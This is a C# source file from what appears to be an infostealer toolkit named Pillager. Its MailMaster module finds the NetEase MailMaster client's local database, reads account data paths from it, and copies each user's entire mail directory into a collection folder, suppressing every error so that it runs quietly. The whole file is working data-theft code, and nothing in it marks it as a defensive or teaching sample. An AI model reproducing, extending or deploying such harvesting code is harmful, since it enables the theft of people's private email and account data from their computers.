using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;

namespace Pillager.Mails
{
    internal class MailMaster
    {
        public static string MailName = "MailMaster";

        private static List<string> GetDataPath()
        {
            List<string> strings = new List<string>();
            string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data\\app.db");
            if (!File.Exists(sqlpath)) return strings;
            string db_tempFile = Path.GetTempFileName();
            try
            {
                File.Copy(sqlpath, db_tempFile, true);
                SQLiteHandler handler = new SQLiteHandler(db_tempFile);
                if (!handler.ReadTable("Account")) return strings;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string path = handler.GetValue(i, "DataPath");
                    strings.Add(path);
                }
            }
            catch { }
            File.Delete(db_tempFile);
            return strings;
        }

        public static List<int> FindBytes(byte[] src, byte[] find)
        {
            List<int> offsets = new List<int>();
            if (src == null || find == null || src.Length == 0 || find.Length == 0 || find.Length > src.Length) return offsets;
            for (int i = 0; i < src.Length - find.Length + 1; i++)
            {
                if (src[i] == find[0])
                {
                    for (int m = 1; m < find.Length; m++)
                    {
                        if (src[i + m] != find[m]) break;
                        if (m == find.Length - 1) offsets.Add(i);
                    }
                }
            }
            return offsets;
        }

        public static void Save(string path)
        {
            try
            {
                string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data");
                if (!Directory.Exists(sqlpath)) return;
                List<string> datapath = GetDataPath();
                string savepath = Path.Combine(path, MailName);
                Directory.CreateDirectory(savepath);
                foreach (var directory in datapath)
                {
                    Methods.CopyDirectory(directory, Path.Combine(savepath, Path.GetFileName(directory)), true);
                }
            }
            catch { }
        }
    }
}
